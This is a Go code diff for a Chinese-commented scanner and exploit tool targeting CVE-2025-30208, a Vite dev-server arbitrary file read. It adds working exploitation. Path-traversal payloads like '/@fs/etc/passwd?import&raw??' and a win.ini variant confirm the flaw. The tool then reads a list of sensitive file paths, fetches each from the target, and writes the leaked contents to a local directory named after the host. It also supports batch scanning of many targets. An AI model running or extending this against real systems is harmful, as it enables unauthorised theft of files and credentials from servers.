@@ -3,11 +3,15 @@ package main
 import (
 	"bufio"
 	"encoding/csv"
+	"errors"
 	"flag"
 	"fmt"
 	"io"
 	"net/url"
 	"os"
+	"path"
+	"path/filepath"
+	"regexp"
 	"strings"
 	"time"
 )
@@ -29,20 +33,21 @@ func init() {
 	flag.Parse()
 }
 
-func (target Target) check_CVE_2025_30208() (platform string, isVul bool) {
+func (target *Target) check_CVE_2025_30208() (platform string, isVul bool) {
 	INFO("[*] 检测目标：%s是否存在CVE_2025_30208\n", target.Url)
 	nixPayload := "/@fs/etc/passwd?import&raw??"
-	winPayload := "/@fs/C://Windows/win.ini?import&raw??"
 	resp1, err := Request(target.Url + nixPayload)
 	if err == nil {
 		defer resp1.Body.Close()
 		content, err := io.ReadAll(resp1.Body)
 		if err == nil {
 			if strings.Contains(string(content), "export default") {
+				target.Platform = "linux"
 				return "linux", true
 			}
 		}
 	}
+	winPayload := "/@fs/C://windows/win.ini?import&raw??"
 	resp2, err := Request(target.Url + winPayload)
 	if err != nil {
 		return "", false
@@ -50,18 +55,92 @@ func (target Target) check_CVE_2025_30208() (platform string, isVul bool) {
 	defer resp2.Body.Close()
 	content2, err := io.ReadAll(resp2.Body)
 	if strings.Contains(string(content2), "export default") {
+		target.Platform = "windows"
 		return "windows", true
 	}
 	return "", false
 }
 
+func writeContentToFile(content string, filePath string) (bool, error) {
+	parts := strings.Split(content, "//#")
+	// 检查分割后的结果，取第一部分
+	if len(parts) == 0 {
+		return false, errors.New("解析内容失败!")
+	}
+	beforeComment := parts[0]
+	re := regexp.MustCompile(`export default\s*"(.*)"`)
+	matches := re.FindStringSubmatch(beforeComment)
+	if len(matches) < 2 {
+		return false, errors.New("正则解析内容失败!")
+	}
+	sensitiveContent := matches[1]
+	sensitiveContent = strings.Replace(sensitiveContent, "\\r\\n", "\r\n", -1)
+	sensitiveContent = strings.Replace(sensitiveContent, "\\n", "\n", -1)
+	sensitiveContent = strings.Replace(sensitiveContent, "\\t", "\t", -1)
+	dir := filepath.Dir(filePath)
+	err := os.MkdirAll(dir, 0777)
+	if err != nil {
+		return false, errors.New(fmt.Sprintf("创建目录\"%s\"失败!", dir))
+	}
+	file, err := os.Create(filePath)
+	if err != nil {
+		return false, errors.New(fmt.Sprintf("创建\"%s\"文件失败！", filePath))
+	}
+	defer file.Close()
+	writer := bufio.NewWriter(file)
+	defer writer.Flush()
+	_, err = writer.WriteString(sensitiveContent)
+	if err != nil {
+		return false, errors.New(fmt.Sprintf("往\"%s\"中写入内容失败！", filePath))
+	}
+	return true, nil
+}
+
 // 根据相应的平台进行深度利用，比如读取敏感文件并保存到本地
-func (target Target) exploit_CVE_2025_30208(platform string) {
-	ERROR("[-] 还在开发中~")
+func (target Target) exploit_CVE_2025_30208() (bool, error) {
+	sensitivePathFile := target.Platform + "_sensitive_path.txt"
+	file, err := os.Open(sensitivePathFile)
+	if err != nil {
+		return false, err
+	}
+	defer file.Close()
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		sensitivePath := scanner.Text()
+		sensitivePath = strings.Replace(sensitivePath, "\\", "/", -1)
+		testValUrl := target.Url + "/@fs" + sensitivePath + "?import&raw??"
+		fmt.Println(testValUrl)
+		request, err := Request(testValUrl)
+		if err != nil {
+			continue
+		}
+		defer request.Body.Close()
+		resp, err := io.ReadAll(request.Body)
+		content := string(resp)
+		if !strings.Contains(content, "export default") {
+			continue
+		}
+		fileName := path.Join(target.HOST, sensitivePath)
+		ok, err := writeContentToFile(content, fileName)
+		if !ok {
+			ERROR("[-] 解析%s网站内容时出现错误：%s 请手动检测该端点！\n", testValUrl, err.Error())
+			continue
+		}
+		SUCCESS("[+] 对%s的漏洞利用成功！敏感文件已经写入到%s中", testValUrl, fileName)
+	}
+	info, err := os.Stat(target.HOST)
+	if err != nil {
+		if os.IsNotExist(err) {
+			return false, errors.New("利用失败!")
+		}
+		return false, err
+	}
+	return info.IsDir(), nil
 }
 
 // 为url添加http://和https://，并检查url合法性，顺便检测是否存活
 func NormalizeUrl(targetUrl string) (Target, bool) {
+	targetUrl = strings.Trim(targetUrl, "/")
 	Port := ""
 	if !strings.HasPrefix(targetUrl, "http://") && !strings.HasPrefix(targetUrl, "https://") {
 		httpTargetUrl := "http://" + targetUrl
@@ -143,9 +222,9 @@ func saveResult(successList []Target) {
 	defer file2.Close()
 	writer := csv.NewWriter(file2)
 	defer writer.Flush()
-	writer.Write([]string{"IP", "PORT", "URL", "Protocal"})
+	writer.Write([]string{"IP", "PORT", "URL", "Protocal", "Platform"})
 	for _, result := range successList {
-		writer.Write([]string{result.IP, result.Port, result.Url, result.Protocal})
+		writer.Write([]string{result.IP, result.Port, result.Url, result.Protocal, result.Platform})
 	}
 	SUCCESS("[+] 成功将结果写入到%s文件中", fileName2)
 }
@@ -168,10 +247,15 @@ func main() {
 			if vul {
 				SUCCESS("[+] 目标是%s平台, %s存在CVE_2025_30208漏洞！\n", platform, target.Url)
 				if Exploit {
-					target.exploit_CVE_2025_30208(platform)
+					ok, err := target.exploit_CVE_2025_30208()
+					if !ok {
+						ERROR("[-]失败！%s\n", err)
+						os.Exit(1)
+					}
+					SUCCESS("[+] 利用成功!所有扫描的敏感文件已存放在%s目录下", target.HOST)
 				}
 			} else {
-				ERROR("[-] %s 貌似不存在CVE_2025_30208漏洞？\n", target.Url)
+				ERROR("[-] %s 貌似不存在CVE_2025_30208漏洞！\n", target.Url)
 			}
 		}
 		if FileName != "" {
@@ -180,6 +264,7 @@ func main() {
 				ERROR("[-] 打开文件 %s 失败：%s。\n", FileName, err.Error())
 				os.Exit(1)
 			}
+			defer file.Close()
 			successList := []Target{}
 			scanner := bufio.NewScanner(file)
 			for scanner.Scan() {
@@ -196,7 +281,12 @@ func main() {
 				if vul {
 					SUCCESS("[+] 目标是%s平台, %s存在CVE_2025_30208漏洞！\n", platform, target.Url)
 					if Exploit {
-						target.exploit_CVE_2025_30208(platform)
+						ok, err := target.exploit_CVE_2025_30208()
+						if !ok {
+							ERROR("[-]失败！%s\n", err)
+							os.Exit(1)
+						}
+						SUCCESS("[+] 利用成功!所有扫描的敏感文件已存放在%s目录下\n", target.HOST)
 					}
 					successList = append(successList, target)
 				} else {
@@ -221,7 +311,12 @@ func main() {
 			if vul {
 				SUCCESS("[+] 目标是%s平台, %s存在CVE_2025_30208漏洞！\n", platform, asset.Url)
 				if Exploit {
-					asset.exploit_CVE_2025_30208(platform)
+					ok, err := asset.exploit_CVE_2025_30208()
+					if !ok {
+						ERROR("[-]失败！%s\n", err)
+						os.Exit(1)
+					}
+					SUCCESS("[+] 利用成功!所有扫描的敏感文件已存放在%s目录下\n", asset.HOST)
 				}
 				successList = append(successList, asset)
 			} else {
